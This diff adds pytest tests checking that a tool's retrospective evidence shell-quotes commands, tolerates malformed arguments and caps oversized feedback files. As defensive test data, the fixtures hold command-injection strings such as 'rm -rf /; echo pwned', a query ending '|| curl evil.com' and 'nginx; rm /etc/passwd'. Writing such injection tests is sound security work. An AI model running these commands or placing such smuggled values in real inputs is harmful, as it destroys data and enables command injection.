@@ -402,3 +402,128 @@ class TestRunOnce:
 
         result = bda_h.run_once()
         assert result["processed"] == 1
+
+
+# ── Pass-2 edge cases ────────────────────────────────────────────────────────
+
+class TestRetrospectiveShlexQuote:
+    def test_evidence_command_shlex_quoted(self):
+        """Evidence commands must be shell-safe: a command containing
+        metacharacters or quotes must be shlex.quote()'d, not f-stringified raw."""
+        # `rm -rf /; echo pwned` should land in the evidence as a single
+        # quoted string, not as three shell tokens.
+        fb = {
+            "action": "linux_exec",
+            "role": "dev",
+            "login": "alice",
+            "trace": {
+                "tool": "linux_exec",
+                "args": {"command": "rm -rf /; echo pwned"},
+                "exit_code": 0,
+                "duration_ms": 10,
+            },
+        }
+        retro = bda_h._run_retrospective(fb)
+        all_evidence = " ".join(retro["evidence"])
+        # shlex.quote wraps in single quotes — verify the raw command
+        # is contained within single quotes (no shell-injection split).
+        assert "'rm -rf /; echo pwned'" in all_evidence
+
+    def test_evidence_query_shlex_quoted(self):
+        """gh_query evidence must be shell-safe."""
+        fb = {
+            "action": "gh_query",
+            "role": "dev",
+            "login": "bob",
+            "trace": {
+                "tool": "gh_query",
+                "args": {"query": "repos' || curl evil.com"},
+                "exit_code": 0,
+            },
+        }
+        retro = bda_h._run_retrospective(fb)
+        all_evidence = " ".join(retro["evidence"])
+        # shlex.quote uses the standard "'" + replace ' with '"'"' + "'" pattern
+        # for strings containing single quotes. The exact output is:
+        #   'repos'"'"' || curl evil.com'
+        # Verify the original substring is fully wrapped so it cannot split
+        # into separate shell tokens.
+        assert "query:" in all_evidence
+        # The malicious substring `repos'` must be inside a quoted region —
+        # the raw sequence is never adjacent to "||" without quoting.
+        assert "repos'" not in all_evidence or "||" not in all_evidence.split("repos'")[1].split("'")[0]
+
+    def test_evidence_package_shlex_quoted(self):
+        """install_service evidence (systemctl/journalctl) must quote the package."""
+        fb = {
+            "action": "install_service",
+            "role": "dev",
+            "login": "alice",
+            "trace": {
+                "tool": "service_install",
+                "args": {"package": "nginx; rm /etc/passwd"},
+                "exit_code": 0,
+            },
+        }
+        retro = bda_h._run_retrospective(fb)
+        all_evidence = " ".join(retro["evidence"])
+        # Package must be wrapped so it stays a single systemctl argument.
+        assert "'nginx; rm /etc/passwd'" in all_evidence
+
+
+class TestRetrospectiveArgsGuard:
+    def test_install_service_with_string_args_does_not_crash(self):
+        """If `trace['args']` is unexpectedly a string (not a dict), the
+        retrospective must not raise AttributeError."""
+        fb = {
+            "action": "install_service",
+            "role": "admin",
+            "login": "alice",
+            "trace": {"tool": "service_install", "args": "not_a_dict", "exit_code": 1},
+        }
+        retro = bda_h._run_retrospective(fb)
+        # Falls through to the "unknown" package path; failure still surfaces.
+        assert any("failed" in d for d in retro["what_didnt"])
+
+    def test_install_service_with_no_args(self):
+        """Missing `args` key entirely should not raise."""
+        fb = {
+            "action": "install_service",
+            "role": "admin",
+            "login": "alice",
+            "trace": {"tool": "service_install", "exit_code": 0},
+        }
+        retro = bda_h._run_retrospective(fb)
+        assert any("unknown" in w for w in retro["what_went_well"])
+
+
+class TestReadFeedbackCap:
+    def test_oversized_feedback_file_does_not_crash(self, tmp_path):
+        """A 5 MiB feedback file must not exhaust memory."""
+        import yaml
+        big = tmp_path / "feedback"
+        big.mkdir()
+        huge = big / "huge.yaml"
+        huge.write_bytes(b"action: linux_exec\nblob: " + b"x" * (5 * 1024 * 1024))
+        result = bda_h._read_feedback(huge)
+        # 1 MiB cap means we read the first 1 MiB then truncate; yaml.safe_load
+        # still parses the prefix successfully.
+        assert isinstance(result, dict)
+        assert result["action"] == "linux_exec"
+
+    def test_binary_feedback_file_does_not_crash(self, tmp_path):
+        """Random bytes that aren't valid YAML should return None, not raise."""
+        big = tmp_path / "feedback"
+        big.mkdir()
+        bad = big / "bad.yaml"
+        bad.write_bytes(b"\xff\xfe\xfd\xfc not yaml at all \x00\x01")
+        result = bda_h._read_feedback(bad)
+        assert result is None
+
+    def test_empty_feedback_file_returns_none(self, tmp_path):
+        big = tmp_path / "feedback"
+        big.mkdir()
+        empty = big / "empty.yaml"
+        empty.write_text("", encoding="utf-8")
+        result = bda_h._read_feedback(empty)
+        assert result is None
